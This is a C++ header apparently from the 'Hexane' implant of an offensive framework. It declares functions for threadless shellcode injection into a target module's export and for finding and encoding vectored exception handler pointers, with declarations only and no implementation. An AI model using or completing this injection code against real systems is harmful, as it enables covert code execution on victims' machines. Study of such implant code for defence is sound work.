#ifndef HEXANE_IMPLANT_INJECT_HPP
#define HEXANE_IMPLANT_INJECT_HPP
#include <core/corelib.hpp>

struct _threadless {
    _mbs_buffer Parent;
    _mbs_buffer Module;
    _mbs_buffer Export;
    _mbs_buffer Loader;
    _mbs_buffer Opcode;
};

namespace Injection {
    FUNCTION VOID Threadless(_threadless threadless, void *shellcode, size_t n_shellcode, size_t total_length);

    namespace Veh {
        FUNCTION UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *signature, const char *mask);
        FUNCTION UINT_PTR PointerEncoder(uintptr_t handler, bool encode);
    }
}
#endif //HEXANE_IMPLANT_INJECT_HPP
